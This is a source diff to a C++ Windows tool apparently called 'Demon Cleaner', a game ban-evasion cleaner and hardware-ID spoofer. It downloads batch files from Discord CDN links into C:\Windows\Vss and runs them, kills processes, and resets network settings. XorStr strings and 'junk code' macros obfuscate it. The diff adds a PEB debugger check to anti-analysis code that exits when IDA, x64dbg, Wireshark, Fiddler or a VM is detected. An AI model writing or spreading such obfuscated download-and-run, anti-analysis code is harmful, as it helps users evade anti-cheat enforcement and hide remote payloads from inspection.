@@ -17,6 +17,22 @@
 #include "antidbg.h"
 #include <cstdio>
 #define SHOW_DEBUG_MESSAGES
+int CheckTEB()
+{
+    int isBeingDebugged = 0;
+    __asm
+    {
+        ; Grab the PEB at offset 30 of the fs register
+        mov eax, fs: [30h]
+        ; push it to the stack
+        push ecx
+        ; Grab the IsBeingDebugged flag out of the PED
+        mov ecx, [eax + 2]
+        mov isBeingDebugged, ecx
+        pop ecx
+    }
+    return isBeingDebugged;
+}
 bool IsProcessRunning(const wchar_t* processName)
 {
     bool exists = false;
@@ -244,11 +260,7 @@ void SizeOfImage()
 void apex()
 {
 
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
+    CppJunkCodeFucker();
     JUNK_CODE_ONE
         JUNK_CODE_ONE
     std::string apex = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114575800954941/apex.bat"));
@@ -261,13 +273,8 @@ void apex()
 }
 void gta()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    JunkCodeFucker();
+    CppJunkCodeFucker();
 
     std::string gta = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114574483918858/gta.bat"));
     std::string gtapath = "C:\\Windows\\Vss\\gta.bat";
@@ -278,13 +285,8 @@ void gta()
 }
 void fortnite()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
 
     std::string fortnite = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114573007527946/Fortnite.bat"));
     std::string fortnitepath = "C:\\Windows\\Vss\\Fortnite.bat";
@@ -294,13 +296,8 @@ void fortnite()
 }
 void fishingplanet()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     std::string fishingplanet = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114571648593931/fishing-planet.bat"));
     std::string fishingplanetpath = "C:\\Windows\\Vss\\Fishing-planet.bat";
     URLDownloadToFileA(NULL, fishingplanet.c_str(), fishingplanetpath.c_str(), 0, NULL);
@@ -310,13 +307,8 @@ void fishingplanet()
 }
 void cod()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     std::string cod = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/880114570369318962/Cold-Ware.bat"));
     std::string codpath = "C:\\Windows\\Vss\\Cold-Ware.bat";
     URLDownloadToFileA(NULL, cod.c_str(), codpath.c_str(), 0, NULL);
@@ -328,13 +320,8 @@ void cod()
 
 
 void cleaner() {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM wargamingerrormonitor.exe 2>NULL").c_str());
@@ -443,13 +430,8 @@ void cleaner() {
 }
 void deleter()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
 
     //delete the files we downloaded
     system("cd C:\\Windows\Vss\\");
@@ -466,19 +448,10 @@ void deleter()
 
 void safeshutdown()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     system(XorStr("cls").c_str());
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
+    CppJunkCodeFucker();
     string a;
     std::cout << RED << "\nunloading kernel modules";
     Sleep(3500);
@@ -520,13 +493,8 @@ void safeshutdown()
 }
 void driverdetect()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     const TCHAR* devices[] = {
 _T("\\\\.\\Dumper"),
 _T("\\\\.\\KsDumper")
@@ -551,18 +519,9 @@ _T("\\\\.\\KsDumper")
 
 void spoofer()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
+    CppJunkCodeFucker();
+    JunkCodeFucker();
+        CppJunkCodeFucker();
 
 
 
@@ -578,11 +537,7 @@ void spoofer()
     Sleep(2000);
     deleter();
     Sleep(2000);
-    rydekem();
-    plvbjwh();
-
-    akfuxnl();
-    lnttirs();
+    CppJunkCodeFucker();
     system(XorStr("NETSH WINSOCK RESET").c_str());
     system(XorStr("NETSH INT IP RESET").c_str());
     system(XorStr("NETSH INTERFACE IPV4 RESET").c_str());
@@ -620,120 +575,56 @@ vector<string> serial;
 
 void loadserial()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
 
     serial.push_back(XorStr("384604182").c_str());
     serial.push_back(XorStr("2953439145").c_str());
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
 }
 
 void mainbot()
 {
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-    
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    JunkCodeFucker();
+        CppJunkCodeFucker();
+    JunkCodeFucker();
     TCHAR volumeName[MAX_PATH + 1] = { 0 };
     TCHAR fileSystemName[MAX_PATH + 1] = { 0 };
     DWORD serialNumber = 0;
     DWORD maxComponentLen = 0;
     DWORD fileSystemFlags = 0;
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     
-    JUNK_CODE_ONE
-        rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-           
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    JunkCodeFucker();
+        CppJunkCodeFucker();
+        JunkCodeFucker();
     if (GetVolumeInformation(_T("C:\\"), volumeName, ARRAYSIZE(volumeName), &serialNumber, &maxComponentLen, &fileSystemFlags, fileSystemName, ARRAYSIZE(fileSystemName)));
     while (true)
     {
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-        JUNK_CODE_ONE
+        JunkCodeFucker();
+            CppJunkCodeFucker();
+        JunkCodeFucker();
         if (find(serial.begin(), serial.end(), to_string(serialNumber)) != serial.end())
         {
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
             MemoryBreakpointDebuggerCheck();
 
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
-            JUNK_CODE_ONE
+            JunkCodeFucker();
             SetConsoleTitle(_T("Demon Cleaner V1.0 [release build]"));
             setcolor(12);
             std::cout << " _| |___ _____ ___ ___ \n";
             std::cout << "| . | -_|     | . |   |\n";
             std::cout << "|___|___|_|_|_|___|_|_|\n";
-
-            JUNK_CODE_ONE
+            JunkCodeFucker();
             std::cout << "\n";
 
             system(XorStr("start http://demoncleaner.gq").c_str());
@@ -746,16 +637,8 @@ void mainbot()
             std::cout << GREEN << "\nloading in memory...";
             Sleep(2400);
             system(XorStr("cls").c_str());
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
             cleaner();
             fishingplanet();
             gta();
@@ -763,39 +646,21 @@ void mainbot()
             cod();
             fortnite();
             spoofer();
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
         }
         
         else
         {
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
             system(XorStr("cls").c_str());
             std::cout << CYAN << "Sorry but you are not in our database or you are banned. " << std::endl;
             std::cout << GREEN << "serial : ";
             std::cout << serialNumber << std::endl;
             Sleep(3000);
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
             exit(0);
 
         }
@@ -847,11 +712,7 @@ void otherthing()
 }
 void HideFromDebugger()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
+    CppJunkCodeFucker();
     OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
         TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -893,57 +754,45 @@ inline bool HideThread(HANDLE hThread)
 void startup();
 int _start()
 {
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
         HideThread;
     startup();
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    CppJunkCodeFucker();
+    JunkCodeFucker();
 
 }
 void startup()
 {
     
-    rydekem();
-    plvbjwh();
-    tlmisir();
-    akfuxnl();
-    lnttirs();
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-
+    CppJunkCodeFucker();
+    JunkCodeFucker();
     LPCWSTR windowName = L"x32dbg";
     LPCWSTR vmname = L"VMware Workstation";
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    JunkCodeFucker();
     
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    JunkCodeFucker();
 
     
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
-
+    JunkCodeFucker();
+        if (CheckTEB())
+        {
+            trampoline;
+            CppJunkCodeFucker();
+            JunkCodeFucker();
+                OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
+                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
+                    TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
+            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Detected && ECHO Debugger Detected. && TIMEOUT 10 >nul").c_str());
+            SetLastError(1);
+            exit(0);
+        }
         if (IsDebuggerPresent())
         {
             trampoline;
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
                 OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                     TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                     TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -956,13 +805,8 @@ void startup()
         if (FindWindow(NULL, windowName))
         {
             trampoline;
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
                 OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                     TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                     TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -976,13 +820,8 @@ void startup()
     if (FindWindow(NULL, vmname))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -992,8 +831,7 @@ void startup()
         exit(0);
 
     }
-    JUNK_CODE_ONE
-        JUNK_CODE_ONE
+    JunkCodeFucker();
 
        
 
@@ -1004,11 +842,8 @@ void startup()
         {
 
 
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1018,20 +853,13 @@ void startup()
             build_date();
             build_time();
             loadserial();
-            rydekem();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
 
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
+                CppJunkCodeFucker();
+                JunkCodeFucker();
                 mainbot();
-            rydekem();
-            plvbjwh();
+            CppJunkCodeFucker();
             
 
                 
@@ -1046,14 +874,8 @@ int main()
     if (IsProcessRunning(L"ida.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1065,14 +887,8 @@ int main()
     if (IsProcessRunning(L"ProcessHacker.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1084,14 +900,8 @@ int main()
     if (IsProcessRunning(L"Fiddler.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1103,14 +913,8 @@ int main()
     if (IsProcessRunning(L"Fiddler.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1122,14 +926,8 @@ int main()
     if (IsProcessRunning(L"Wireshark.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1141,14 +939,8 @@ int main()
     if (IsProcessRunning(L"PETools.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1160,14 +952,8 @@ int main()
     if (IsProcessRunning(L"procexp.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1179,14 +965,8 @@ int main()
     if (IsProcessRunning(L"ImmunityDebugger.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1198,14 +978,8 @@ int main()
     if (IsProcessRunning(L"ida64.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1217,14 +991,8 @@ int main()
     if (IsProcessRunning(L"windbg.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1236,14 +1004,8 @@ int main()
     if (IsProcessRunning(L"httpdebugger.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1255,14 +1017,8 @@ int main()
     if (IsProcessRunning(L"x32dbg.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1274,14 +1030,8 @@ int main()
     if (IsProcessRunning(L"x64dbg.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1293,14 +1043,8 @@ int main()
     if (IsProcessRunning(L"idaq.exe"))
     {
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1311,15 +1055,10 @@ int main()
     }
     if (IsProcessRunning(L"idaq64.exe"))
     {
+        JunkCodeFucker();
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1330,15 +1069,10 @@ int main()
     }
     if (IsProcessRunning(L"ollydbg.exe"))
     {
+        JunkCodeFucker();
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1349,16 +1083,10 @@ int main()
     }
     if (GetLastError != 0)
     {
-        
+        JunkCodeFucker();
             trampoline;
-            rydekem();
-            plvbjwh();
-            tlmisir();
-            akfuxnl();
-            lnttirs();
-            JUNK_CODE_ONE
-                JUNK_CODE_ONE
-                JUNK_CODE_ONE
+            CppJunkCodeFucker();
+            JunkCodeFucker();
                 OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                     TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                     TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1369,29 +1097,18 @@ int main()
     }
     if (GetLastError == 0)
     {
+        JunkCodeFucker();
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
         _start();
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
@@ -1399,19 +1116,14 @@ int main()
     }
     else
     {
+        JunkCodeFucker();
         OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
             TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s"));
         trampoline;
-        rydekem();
-        plvbjwh();
-        tlmisir();
-        akfuxnl();
-        lnttirs();
-        JUNK_CODE_ONE
-            JUNK_CODE_ONE
-            JUNK_CODE_ONE
+        CppJunkCodeFucker();
+        JunkCodeFucker();
             OutputDebugString(TEXT("%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
                 TEXT("%s%s%s%s%s%s%s%s%s%s%s%s%s")
